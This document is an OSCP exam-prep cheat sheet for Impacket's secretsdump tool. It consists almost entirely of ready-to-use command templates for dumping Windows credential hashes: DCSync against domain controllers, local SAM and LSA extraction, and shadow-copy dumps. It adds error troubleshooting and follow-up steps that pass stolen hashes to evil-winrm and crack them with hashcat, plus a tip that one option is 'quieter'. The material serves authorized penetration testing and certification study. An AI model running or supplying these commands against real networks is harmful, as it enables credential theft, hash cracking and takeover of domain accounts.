# Impacket secretsdump.py — OSCP Cheat Sheet

## Basic Usage
```bash
impacket-secretsdump <DOMAIN>/<USER>:'<PASS>'@<IP>
impacket-secretsdump ./<USER>:'<PASS>'@<IP>
impacket-secretsdump <DOMAIN>/<USER>@<IP> -hashes <LMHASH>:<NTHASH>
impacket-secretsdump <DOMAIN>/<USER>@<IP> -k -no-pass
```

## Domain Controller (DCSync / DRSUAPI)
```bash
impacket-secretsdump <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc
impacket-secretsdump <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc-user <TARGET_USER>
impacket-secretsdump <DOMAIN>/<USER>:'<PASS>'@<DC_HOST> -dc-ip <DC_IP>
```

## Local SAM & LSA (Admin Required)
```bash
impacket-secretsdump ./Administrator:'<PASS>'@<IP>
```

## Alternative Method
```bash
impacket-secretsdump <DOMAIN>/<USER>:'<PASS>'@<IP> -use-vss
```

## Output to File
```bash
impacket-secretsdump <DOMAIN>/<USER>:'<PASS>'@<IP> -outputfile secretsdump_out
```

## Common Errors
```text
STATUS_ACCESS_DENIED            -> Not admin / no DCSync rights
ERROR_DS_DRA_ACCESS_DENIED      -> No replication permissions
STATUS_LOGON_FAILURE            -> Bad creds / wrong domain / special chars
Kerberos issues                 -> Use -target-ip or NTLM
```

## Post-Exploitation
```bash
evil-winrm -i <IP> -u <USER> -H <NTHASH>
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

## OSCP Notes
- DCSync requires Replicating Directory Changes
- -just-dc is faster and quieter
- Try member servers if DC fails
- Escape special characters in passwords
